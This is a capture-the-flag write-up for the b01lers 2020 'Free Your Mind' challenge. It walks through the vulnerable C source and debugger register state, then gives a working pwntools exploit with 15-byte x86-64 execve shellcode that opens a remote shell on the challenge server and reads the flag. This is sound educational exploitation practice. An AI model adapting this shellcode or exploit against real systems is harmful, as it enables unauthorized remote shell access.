# b01lers bootcamp CTF 2020

## Free Your Mind

> 200
>
> Next up, hack the matrix again, but this time, insert your own code.
>
> `nc chal.ctf.b01lers.com 1007`
> 
> [shellcoding](shellcoding)  
> [shellcoding.c](shellcoding.c)

Tags: _pwn_ _x86-64_ _remote-shell_ _shellcode_


## Summary

Easy size restricted shellcode simulator.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Stack canary and nothing else.  This _is_ a shellcode task.


### Read the source

```c
#include <stdio.h>
#include <unistd.h>

char shellcode[16];

int main() {
    char binsh[8] = "/bin/sh";

    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    printf("I'm trying to free your mind, Neo. But I can only show you the door. You're the one that has to walk through it.\n");
    read(0, shellcode, 16);

    ((void (*)()) (shellcode))();
}
```

The string `/bin/sh` is provided; without PIE it'll be easy to find and use.  The only restriction is that our shellcode must be no more than 16 bytes.

With that limitation it's worth checking if we get anything for free.

Set a breakpoint just before the shellcode call and look at the registers:

```
gef➤  b *main+147
Breakpoint 1 at 0x401229
```

Registers:

```
$rax   : 0x0
$rbx   : 0x0000000000401250  →  <__libc_csu_init+0> endbr64
$rcx   : 0x00007ffff7ed2142  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x0000000000404090  →  0x0000000a68616c62 ("blah\n"?)
$rsp   : 0x00007fffffffe330  →  0x0068732f6e69622f ("/bin/sh"?)
$rbp   : 0x00007fffffffe340  →  0x0000000000000000
$rsi   : 0x0000000000404090  →  0x0000000a68616c62 ("blah\n"?)
$rdi   : 0x0
$rip   : 0x0000000000401229  →  <main+147> call rdx
$r8    : 0x71
$r9    : 0x00007ffff7fe0d50  →   endbr64
$r10   : 0xfffffffffffff27d
$r11   : 0x246
$r12   : 0x00000000004010b0  →  <_start+0> endbr64
$r13   : 0x00007fffffffe430  →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
```

To use `execve` we must have both `$rsi` and `$rdx` set to zero.  No free rides here, both will have to be set.

With `$rax` already zero we can get by with the smaller `mov al,0x3b` instruction.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./shellcoding')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1007)

payload = asm(f'''
mov edi,{hex(binary.search(b'/bin/sh').__next__())}
xor rsi,rsi
xor rdx,rdx
mov al,0x3b
syscall
''')

log.info('payload length: ' + str(len(payload)))

p.sendafter('walk through it.\n',payload)
p.interactive()
```

Nothing much here but our space optimized (15-byte) payload.

For the curious the bytes for each instruction:

```assembly
bf b3 11 40 00       	mov edi,0x4011b3
48 31 f6             	xor rsi,rsi
48 31 d2             	xor rdx,rdx
b0 3b                	mov al,0x3b
0f 05                	syscall
```




Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/b01lersbootcampctf2020/free_your_mind/shellcoding'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to chal.ctf.b01lers.com on port 1007: Done
[*] payload length: 15
[*] Switching to interactive mode
$ id
uid=1000(shellcoding) gid=1000(shellcoding) groups=1000(shellcoding)
$ ls -l
total 36
-r-xr-x--- 1 root shellcoding    86 Oct  2 15:31 Makefile
-r--r----- 1 root shellcoding    38 Oct  2 15:31 flag.txt
-r-xr-x--- 1 root shellcoding 16912 Oct  3 04:08 shellcoding
-r-xr-x--- 1 root shellcoding   362 Oct  2 15:31 shellcoding.c
-r-xr-x--- 1 root shellcoding    51 Oct  2 15:31 wrapper.sh
$ cat flag.txt
flag{cust0m_sh3llc0d1ng_c4n_b33_c00l}
```